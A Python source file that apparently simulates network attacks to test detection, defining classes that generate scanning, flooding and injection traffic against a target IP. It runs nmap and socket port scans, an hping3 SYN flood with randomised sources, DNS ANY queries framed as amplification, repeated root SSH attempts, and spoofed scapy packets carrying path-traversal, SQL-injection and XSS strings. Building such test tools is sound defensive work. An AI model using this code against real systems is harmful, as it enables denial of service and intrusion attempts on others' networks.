import threading
import subprocess
import socket
import time
import random
from concurrent.futures import ThreadPoolExecutor
from scapy.all import IP, TCP, UDP, Raw, send

class ThreatSimulator:
    def __init__(self, target_ip="192.168.1.1"):
        self.target_ip = target_ip
        self.is_running = False
        self.source_ips = [
            f"10.0.0.{i}" for i in range(2, 50)
        ] + [
            f"172.16.0.{i}" for i in range(2, 50)
        ] + [
            f"192.168.2.{i}" for i in range(2, 50)
        ]
    
    def start_threat_simulation(self):
        """Start multiple threat simulations"""
        self.is_running = True
        print("🔥 Starting threat simulation...")
        
        # Start different threat types in separate threads
        threads = [
            threading.Thread(target=self.nmap_scan),
            threading.Thread(target=self.port_scan),
            threading.Thread(target=self.syn_flood),
            threading.Thread(target=self.dns_amplification),
            threading.Thread(target=self.brute_force_attempts)
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
    
    def stop_threat_simulation(self):
        """Stop all threat simulations"""
        self.is_running = False
        print("🛑 Threat simulation stopped")
    
    def nmap_scan(self):
        """Simulate network reconnaissance"""
        while self.is_running:
            try:
                # Quick TCP SYN scan
                subprocess.run([
                    'nmap', '-sS', '-T4', '-p', '22,80,443,3389,5900',
                    '--max-retries', '1', '--host-timeout', '30s',
                    self.target_ip
                ], capture_output=True)
                print("🔍 NMAP scan completed")
            except Exception as e:
                print(f"NMAP error: {e}")
            time.sleep(60)
    
    def port_scan(self):
        """Rapid port scanning simulation"""
        ports_to_scan = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080]
        
        while self.is_running:
            try:
                with ThreadPoolExecutor(max_workers=10) as executor:
                    for port in ports_to_scan:
                        executor.submit(self.scan_port, port)
                print("🚨 Port scan simulation completed")
            except Exception as e:
                print(f"Port scan error: {e}")
            time.sleep(45)
    
    def scan_port(self, port):
        """Scan individual port"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((self.target_ip, port))
            sock.close()
        except:
            pass
    
    def syn_flood(self):
        """Simulate SYN flood attack"""
        while self.is_running:
            try:
                # Use hping3 for SYN flood
                subprocess.run([
                    'timeout', '10', 'hping3', '-S', '-p', '80', '--flood',
                    '--rand-source', self.target_ip
                ], capture_output=True)
                print("🌊 SYN flood simulated")
            except Exception as e:
                print(f"SYN flood error: {e}")
            time.sleep(120)
    
    def dns_amplification(self):
        """Simulate DNS amplification attack patterns"""
        while self.is_running:
            try:
                # Generate large DNS queries
                subprocess.run([
                    'dig', '@8.8.8.8', 'ANY', 'google.com', '+edns=0', '+bufsize=4096'
                ], capture_output=True)
                print("📡 DNS amplification pattern generated")
            except Exception as e:
                print(f"DNS error: {e}")
            time.sleep(30)
    
    def brute_force_attempts(self):
        """Simulate SSH brute force attempts"""
        while self.is_running:
            try:
                # Multiple failed SSH connections
                for i in range(5):
                    subprocess.run([
                        'ssh', '-o', 'ConnectTimeout=1',
                        '-o', 'BatchMode=yes',
                        f'root@{self.target_ip}', 'exit'
                    ], capture_output=True)
                print("🔑 SSH brute force simulation completed")
            except Exception as e:
                print(f"SSH error: {e}")
            time.sleep(90)

class PacketInjector:
    def __init__(self, target_ip="192.168.1.1"):
        self.target_ip = target_ip
        self.source_ips = [
            f"10.0.0.{i}" for i in range(2, 50)
        ] + [
            f"172.16.0.{i}" for i in range(2, 50)
        ] + [
            f"192.168.2.{i}" for i in range(2, 50)
        ]
    
    def inject_port_scan(self):
        """Inject port scanning packets"""
        print("📡 Injecting port scan packets...")
        for port in [22, 23, 80, 443, 3389, 8080]:
            src_ip = random.choice(self.source_ips)
            
            # TCP SYN packet (port scan)
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=port, flags="S")
            packet = ip_layer/tcp_layer
            
            send(packet, verbose=0)
        print("✅ Port scan packets injected")
    
    def inject_syn_flood(self):
        """Inject SYN flood packets"""
        print("🌊 Injecting SYN flood packets...")
        for _ in range(20):
            src_ip = f"10.0.1.{random.randint(1, 254)}"
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=80, flags="S")
            packet = ip_layer/tcp_layer
            
            send(packet, verbose=0)
        print("✅ SYN flood packets injected")
    
    def inject_ddos_pattern(self):
        """Inject DDoS pattern packets"""
        print("⚡ Injecting DDoS pattern packets...")
        for _ in range(15):
            src_ip = random.choice(self.source_ips)
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            
            # UDP flood (common in DDoS)
            udp_layer = UDP(sport=random.randint(1024, 65535), dport=53)
            payload = Raw(load="A" * 50)  # Medium payload
            
            packet = ip_layer/udp_layer/payload
            send(packet, verbose=0)
        print("✅ DDoS pattern packets injected")
    
    def inject_malformed_packets(self):
        """Inject malformed/abnormal packets"""
        print("🎭 Injecting malformed packets...")
        
        # TCP with invalid flags
        ip_layer = IP(src=random.choice(self.source_ips), dst=self.target_ip)
        tcp_layer = TCP(sport=12345, dport=80, flags="FRPU")  # All flags set
        packet = ip_layer/tcp_layer
        send(packet, verbose=0)
        
        print("✅ Malformed packets injected")
    
    def inject_suspicious_payloads(self):
        """Inject packets with suspicious payloads"""
        print("🕵️ Injecting suspicious payload packets...")
        suspicious_payloads = [
            b"/etc/passwd",  # Path traversal attempt
            b"union select",  # SQL injection
            b"<script>alert",  # XSS attempt
            b"../../../../",  # Directory traversal
        ]
        
        for payload in suspicious_payloads:
            src_ip = random.choice(self.source_ips)
            ip_layer = IP(src=src_ip, dst=self.target_ip)
            tcp_layer = TCP(sport=random.randint(1024, 65535), dport=80)
            raw_layer = Raw(load=payload)
            
            packet = ip_layer/tcp_layer/raw_layer
            send(packet, verbose=0)
        
        print("✅ Suspicious payload packets injected")